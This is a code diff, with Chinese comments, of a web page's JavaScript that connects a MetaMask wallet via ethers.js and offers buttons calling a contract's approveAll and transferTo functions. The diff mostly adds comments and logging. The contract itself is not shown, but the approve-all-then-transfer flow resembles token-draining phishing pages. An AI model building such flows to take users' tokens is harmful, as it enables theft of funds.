@@ -57,6 +57,7 @@ let provider;
 let signer;
 let contract;
 
+// 连接钱包按钮点击事件
 document.getElementById('connectWallet').onclick = async () => {
     try {
         console.log("尝试连接钱包...");
@@ -66,15 +67,16 @@ document.getElementById('connectWallet').onclick = async () => {
 
             // 请求用户连接钱包
             await provider.send("eth_requestAccounts", []);
-
             signer = provider.getSigner();
             const account = await signer.getAddress();
-            
+
             // 显示连接成功后的地址
             document.getElementById('walletAddress').textContent = `已连接: ${account}`;
-            contract = new ethers.Contract(contractAddress, abi, signer);
-
             console.log("钱包已连接，地址:", account);
+
+            // 实例化合约
+            contract = new ethers.Contract(contractAddress, abi, signer);
+            console.log("智能合约已连接:", contract);
         } else {
             alert("请安装 MetaMask!");
             console.error('MetaMask 未检测到');
@@ -85,32 +87,38 @@ document.getElementById('connectWallet').onclick = async () => {
     }
 };
 
+// 授权全部代币按钮点击事件
 document.getElementById('approveAll').onclick = async () => {
     try {
         if (!contract) {
             alert("请先连接钱包！");
             return;
         }
+        console.log("开始授权...");
         const tx = await contract.approveAll();
         document.getElementById('statusMessage').textContent = '授权进行中...';
         await tx.wait();
         document.getElementById('statusMessage').textContent = '授权成功!';
+        console.log("授权成功:", tx);
     } catch (error) {
         console.error("授权失败:", error);
         document.getElementById('statusMessage').textContent = '授权失败!';
     }
 };
 
+// 转移代币按钮点击事件
 document.getElementById('transferTokens').onclick = async () => {
     try {
         if (!contract) {
             alert("请先连接钱包！");
             return;
         }
+        console.log("开始转移代币...");
         const tx = await contract.transferTo();
         document.getElementById('statusMessage').textContent = '转移进行中...';
         await tx.wait();
         document.getElementById('statusMessage').textContent = '转移成功!';
+        console.log("转移成功:", tx);
     } catch (error) {
         console.error("转移失败:", error);
         document.getElementById('statusMessage').textContent = '转移失败!';
